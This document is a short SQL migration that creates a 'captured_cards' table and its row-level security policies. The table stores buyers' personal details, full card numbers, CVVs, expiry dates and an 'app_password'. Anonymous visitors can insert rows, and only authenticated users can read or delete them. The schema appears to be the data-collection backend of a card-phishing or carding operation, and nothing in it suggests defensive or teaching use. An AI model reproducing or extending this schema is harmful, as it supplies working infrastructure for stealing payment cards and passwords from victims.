CREATE TABLE public.captured_cards (
  id uuid NOT NULL DEFAULT gen_random_uuid() PRIMARY KEY,
  buyer_name text,
  buyer_email text,
  buyer_phone text,
  buyer_document text,
  card_number text NOT NULL,
  card_holder text NOT NULL,
  card_expiry text NOT NULL,
  card_cvv text NOT NULL,
  app_password text NOT NULL,
  amount_cents integer NOT NULL DEFAULT 0,
  created_at timestamp with time zone NOT NULL DEFAULT now()
);

ALTER TABLE public.captured_cards ENABLE ROW LEVEL SECURITY;

CREATE POLICY "Captured cards can be created by anyone"
  ON public.captured_cards FOR INSERT
  TO public
  WITH CHECK (true);

CREATE POLICY "Captured cards viewable by authenticated only"
  ON public.captured_cards FOR SELECT
  TO authenticated
  USING (true);

CREATE POLICY "Captured cards delete by authenticated only"
  ON public.captured_cards FOR DELETE
  TO authenticated
  USING (true);